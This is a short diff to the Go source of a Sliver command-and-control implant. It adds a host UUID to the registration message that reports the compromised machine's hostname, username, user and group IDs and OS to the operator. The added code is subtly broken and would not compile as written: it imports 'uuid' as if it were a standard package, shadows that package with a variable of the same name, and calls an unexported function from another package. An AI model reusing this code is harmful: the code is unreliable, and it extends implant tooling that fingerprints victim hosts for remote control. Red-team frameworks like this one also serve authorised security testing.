@@ -29,6 +29,7 @@ import (
 	"os/user"
 	"runtime"
 	"time"
+	"uuid"
 
 	// {{if .Config.Debug}}{{else}}
 	"io/ioutil"
@@ -46,6 +47,7 @@ import (
 
 	// {{end}}
 
+	"github.com/bishopfox/sliver/sliver/hostuuid"
 	"github.com/bishopfox/sliver/sliver/limits"
 	"github.com/bishopfox/sliver/sliver/pivots"
 	"github.com/bishopfox/sliver/sliver/transports"
@@ -264,11 +266,19 @@ func getRegisterSliver() *sliverpb.Envelope {
 			filename = "<< error >>"
 		}
 	}
+
+	uuid, err := uuid.Parse(hostuuid.gethostuuid())
+	// Should not happen, but still...
+	if err != nil {
+		uuid = uuid.Must(uuid.NewRandom())
+	}
+
 	data, err := proto.Marshal(&sliverpb.Register{
 		Name:              consts.SliverName,
 		Hostname:          hostname,
 		Username:          currentUser.Username,
 		Uid:               currentUser.Uid,
+		Uuid:              uuid,
 		Gid:               currentUser.Gid,
 		Os:                runtime.GOOS,
 		Version:           version.GetVersion(),
